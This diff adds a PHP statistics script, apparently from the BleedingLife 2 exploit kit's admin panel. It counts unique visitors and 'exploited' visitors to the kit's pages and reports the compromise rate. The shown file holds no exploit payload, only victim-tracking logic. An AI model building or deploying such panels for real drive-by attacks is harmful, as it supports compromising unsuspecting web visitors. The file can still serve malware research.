@@ -1,0 +1,50 @@
+<?
+/*
+BleedingLife 2 - Exploit Test Lab
+Copyright (C) 2011 Blackhat Academy
+
+This program is free software; you can redistribute it and/or
+modify it under the terms of the GNU General Public License
+as published by the Free Software Foundation; either version 2
+of the License, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License
+along with this program; if not, write to the Free Software
+Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+*/
+
+include('../config.php');
+include('../include/sql.php');
+include('../include/visitors.php');
+
+session_start();
+if(($_SESSION["login"] == false)){
+	exit();	
+}
+
+$sql = new CSQL($sqlSettings);
+$sql->open();
+	
+$cvisitors = new CVisitors($sql, $sqlSettings);
+	
+$countVisitors = $cvisitors->getUniqueVisitorsCount();
+$countExploitedVisitors = $cvisitors->getVisitorsExploitedCount();
+$countNotExploitedVisitors = $countVisitors - $countExploitedVisitors;
+	
+	
+if($countVisitors == 0 || $countExploitedVisitors == 0){
+	$exploitedPercentage = 0;
+}else{
+	$exploitedPercentage = round($countExploitedVisitors * 100 / $countVisitors, 2);
+}
+
+?>
+
+document.getElementById("visitors").innerHTML = <? echo $countVisitors; ?>;
+document.getElementById("exploited").innerHTML = <? echo $countExploitedVisitors; ?>;
+document.getElementById("percentage").innerHTML = <? echo $exploitedPercentage; ?>;
